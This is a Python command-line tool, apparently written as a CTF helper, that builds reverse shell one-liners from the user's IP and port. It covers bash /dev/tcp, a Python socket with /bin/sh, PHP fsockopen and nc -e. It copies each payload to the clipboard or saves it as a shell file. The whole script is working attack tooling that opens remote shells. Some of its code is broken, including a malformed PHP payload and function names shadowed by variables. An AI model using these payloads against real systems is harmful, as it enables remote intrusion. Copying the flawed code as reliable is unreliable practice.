#!/usr/bin/python3
# -*- coding: utf-8 -*-

from re import M
import sys
import os
import pyperclip
from time import sleep
from netifaces import interfaces, ifaddresses, AF_INET

ipadd = "0.0.0.0" #Global variable for IP address
port = "0000" #Global variable for port
interf = "N/A" #Global variable for interface

#Main function
def main():
    banner = """   ________               __  _____ __              __     __________________
  / ____/ /_  ___  ____ _/ /_/ ___// /_  ___  ___  / /_   / ____/_  __/ ____/
 / /   / __ \/ _ \/ __ `/ __/\__ \/ __ \/ _ \/ _ \/ __/  / /     / / / /_    
/ /___/ / / /  __/ /_/ / /_ ___/ / / / /  __/  __/ /_   / /___  / / / __/    
\____/_/ /_/\___/\__,_/\__//____/_/ /_/\___/\___/\__/   \____/ /_/ /_/       
                                                                             """
    print(banner)
    print('<------------------------------------------------------->')
    print('[*] Welcome to the Cheatsheet')
    print('[*] This tool is made to help you through the process of CTFs')
    print('[*] You can use this tool to create a reverse shell')
    print("")
    print("+-------------------------------------+")
    print("|[1] Create Reverse Shells            |")
    print("|                                     |")
    print("|[2] Netcat Connection                |")
    print("|                                     |")
    print("|[3] Set Interface IP  (IMPORTANT)    |")
    print("+-------------------------------------+")
    print("")
    print("[!] Local IP : " + ipadd)
    print("[!] Interface : " + interf)
    choice = input('\n[*] Enter your choice : ')
    match choice:                                                       #Match choice
        case '1':                                                      #Create reverse shell
            revershell()
        case '2':                                                     #Netcat connection
            netcat()
        case '3':                                                    #Set interface IP
            setIp()
            backtomain()

#Banner function
def banner():
    banner = """______                             _____ _          _ _
| ___ \                           /  ___| |        | | |
| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|
<------------------------------------------------------->
"""
    print(banner)

#Get IP of interface function
def getIp(interface):
    ipInt = ifaddresses(interface)[AF_INET][0]['addr']
    return ipInt

#Set IP to global variable 'ipadd'
def setIp():
    interface = input('[*] Enter your interface : ')
    getIp(interface)
    globals()['ipadd'] = getIp(interface)
    globals()['interf'] = interface

#Go back to main menu function
def backtomain():
    print('\n[*] Go back to main')
    sleep(1)
    os.system('clear')
    main()

#The main function for reverse shells
def revershell():
    os.system('clear')
    banner = """______                             _____ _          _ _ 
| ___ \                           /  ___| |        | | |
| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|    
<------------------------------------------------------->
- [1] Bash reverse_shell -
- [2] Python reverse_shell -
- [3] PHP reverse_shell -
- [4] Netcat reverse_shell - 
- [6] Exit -
<------------------------------------------------------->"""
    print(banner)
    c_rs = input('\n[*] Enter your choice : ') #Choice for reverse shell
    match c_rs:  #Match choice
        case '1': #Bash reverse shell
            bash()
        case '2': #Python reverse shell
            python()
        case '3': #PHP reverse shell
            php()
        case '4': #Netcat reverse shell
            nc()
        case '6': #Exit
            backtomain()

#Bash reverse shell function
def bash():
    os.system('clear')
    banner()
    port1 = "1234"                                                                  #Setup default port for reverse shell
    if ipadd == "0.0.0.0":                                                          #Check if IP address and Interface  is set
        print("[!] You need to set your interface ip")
        setIp()
        bash()                                                                      #Callback bash function 
    else:                                                                           #If IP address and Interface is set
        port = input('[*] Enter your port (Default : 1234) : ')
        if port == '':
            port = port1                                                            #If no port is entered, use default port
        else:
            globals()['port'] = port                                                #If port is entered, set it to global variable
    print("\n[*] Your shell is creating...")
    sleep(1)
    shell = 'bash -i >& /dev/tcp/' + ipadd + '/' + port + ' 0>&1'                   #Create reverse shell command
    print("[*] Your shell is created")
    choice = input(
        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
    match choice:                                                                   #Match choice
        case 'c':                                                                   #Case C for copy to clipboard
            pyperclip.copy(shell)                                                   #Copy reverse shell command to clipboard
            print("\n[*] Your shell is copied to Clipboard")
            sleep(1)
            backtomain()                                                            #Go back to main menu
        case 'f':                                                                   #Case F for export as file
            file = "shell.sh"                                                       #Create file name
            with open(file, "w") as f:                                              #Open file and write reverse shell command
                f.write(shell)                                                      #Write reverse shell command to file
            print("\n[*] Your shell is exported as " + file)
            sleep(1)
            backtomain()


def python():                                                                       #Python reverse shell function
    os.system('clear')                                                              #Its the same code as bash reverse shell function
    banner()
    port1 = "1234"
    if ipadd == "0.0.0.0":                                                         
        print("[!] You need to set your interface ip")
        setIp()
        python()
    else:
        port = input('[*] Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print("\n[*] Your shell is creating...")
    sleep(1)
    shell = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ipadd + \
        '",' + port + \
            '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
    print("[*] Your shell is created")
    choice = input(
        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
    match choice:
        case 'c':
            pyperclip.copy(shell)
            print("\n[*] Your shell is copied to Clipboard")
            sleep(1)
            backtomain()
        case 'f':
            file = "shell.py"
            with open(file, "w") as f:
                f.write(shell)
            print("\n[*] Your shell is exported as " + file)
            sleep(1)
            backtomain()


def php():                                                                         #PHP reverse shell function
    os.system('clear')                                                            #Its the same code as bash reverse shell function
    banner()
    port1 = "1234"
    if ipadd == "0.0.0.0":
        print("[!] You need to set your interface ip")
        setIp()
        php()
    else:
        port = input('[*] Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print("\n[*] Your shell is creating...")
    sleep(1)
    shell = "php -r '$sock=fsockopen(" + ipadd + \
        "," + port+");exec('/bin/sh -i <&3 >&3 2>&3');'"
    print("[*] Your shell is created")
    choice = input(
        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
    match choice:
        case 'c':
            pyperclip.copy(shell)
            print("\n[*] Your shell is copied to Clipboard")
            sleep(1)
            backtomain()
        case 'f':
            file = "shell.php"
            with open(file, "w") as f:
                f.write(shell)
            print("\n[*] Your shell is exported as " + file)
            sleep(1)
            backtomain()


def nc():                                                                         #Netcat reverse shell function
    os.system('clear')                                                           #Its the same code as bash reverse shell function
    banner()
    port1 = "1234"
    if ipadd == "0.0.0.0":
        print("[!] You need to set your interface ip")
        setIp()
        nc()
    else:
        port = input('[*] Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print("\n[*] Your shell is creating...")
    sleep(1)
    shell = "nc -e /bin/sh " + ipadd + " " + port
    print("[*] Your shell is created")
    choice = input(
        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
    match choice:
        case 'c':
            pyperclip.copy(shell)
            print("\n[*] Your shell is copied to Clipboard")
            sleep(1)
            backtomain()
        case 'f':
            file = "shell.nc"
            with open(file, "w") as f:
                f.write(shell)
            print("\n[*] Your shell is exported as " + file)
            sleep(1)
            backtomain()


def netcat():
    os.system('clear')
    banner = """
███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝  
<------------------------------------------------------->"""
    print(banner)


main()
